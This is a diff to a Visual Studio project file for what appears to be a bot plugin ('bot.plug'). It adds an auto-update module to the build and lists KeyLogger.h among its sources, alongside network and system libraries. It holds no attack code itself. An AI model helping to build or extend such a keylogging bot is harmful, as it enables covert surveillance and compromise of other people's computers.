@@ -230,7 +230,7 @@
 			<Tool
 				Name="VCLinkerTool"
 				AdditionalDependencies="..\..\source\lib\ntdll.lib shlwapi.lib Ws2_32.lib urlmon.lib Crypt32.lib ..\..\source\lib\winsta.lib Wininet.lib gdiplus.lib Iphlpapi.lib"
-				OutputFile="$(OutDir)\DBG_bot.plug"
+				OutputFile="$(OutDir)\bot.plug"
 				LinkIncremental="1"
 				IgnoreAllDefaultLibraries="true"
 				ModuleDefinitionFile="Bot_Plug.def"
@@ -383,6 +383,10 @@
 			</File>
 			<File
 				RelativePath=".\Bot_Plug.def"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\BotAutoUpdate.cpp"
 				>
 			</File>
 			<File
@@ -780,6 +784,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\BotAutoUpdate.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotClasses.h"
 				>
 			</File>
@@ -992,11 +1000,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\KeyLogger.h"
+				RelativePath="..\..\source\Common\KeyLogger.h"
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Common\KeyLogger.h"
+				RelativePath="..\..\Source\Misc\KeyLogger.h"
 				>
 			</File>
 			<File
